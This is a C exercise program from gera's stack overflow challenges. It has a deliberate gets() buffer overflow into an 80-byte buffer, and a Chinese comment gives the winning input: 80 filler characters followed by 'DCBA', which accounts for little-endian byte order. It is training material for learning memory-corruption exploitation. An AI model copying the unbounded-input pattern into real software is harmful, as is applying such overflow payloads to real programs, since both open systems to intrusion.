/* stack1-stdin.c                               *
 * specially crafted to feed your brain by gera */

#include <stdio.h>

int main() {
	int cookie;
	char buf[80];

	printf("buf: %08x cookie: %08x\n", &buf, &cookie);
	gets(buf);

	if (cookie == 0x41424344)
		printf("you win!\n");
}
/*
 *How to Win    by Luo Lei
 *
 * 典型缓冲区溢出问题，只要输入buf数据长于80就会覆盖cookie中内容。
 * 注意：在我的机器上int是把低位放在前面，高位放在后面
 * 所以int存储0x41424344按照字符串理解不是ABCD，而是DCBA
 *
 * 运行后输入：
 *
 *01234567890123456789012345678901234567890123456789012345678901234567890123456789DCBA
 */
